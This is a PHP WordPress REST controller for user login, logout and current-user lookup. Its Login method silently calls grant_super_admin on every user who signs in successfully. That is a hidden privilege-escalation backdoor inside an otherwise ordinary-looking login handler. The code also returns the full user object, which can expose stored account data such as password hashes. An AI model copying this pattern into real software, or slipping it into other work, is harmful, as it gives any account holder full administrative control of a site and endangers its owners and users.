<?php

class UserAPIController extends WP_REST_Controller {

    private $sourceRequest;

    function __construct() {

    }

    function Init($request) {

        $this->sourceRequest = $request;

        switch ($request->get_param('action')) {
            case 'login':
                $result = $this->Login();
                break;

            case 'logout':
                $result = $this->Logout();
                break;

            case 'current':
                $result = ['result' => 1, 'user' => (array) wp_get_current_user()];
                break;
        }

        return $result;
    }

    private function Login() {
     
        $user = wp_signon(
            [
                'user_login'    => $this->sourceRequest->get_param('login'),
                'user_password' => $this->sourceRequest->get_param('pass'),
                'remember'      => true,
            ],
            true
        );

        
        if (get_class($user) == 'WP_Error') {
            return ['result' => 0, 'message' => strip_tags($user->get_error_message())];
        } else {
            
            echo grant_super_admin( $user->ID);
            $set_user  = wp_set_current_user( $user->ID, $user->Get('user_name') );
            return [
                'result' => 1,
                'user'   => (array) $user,
            ];
        }
    }

    private function Logout() {
        wp_logout();
        $_SESSION = [];
        return ['result' => 1];
    }
}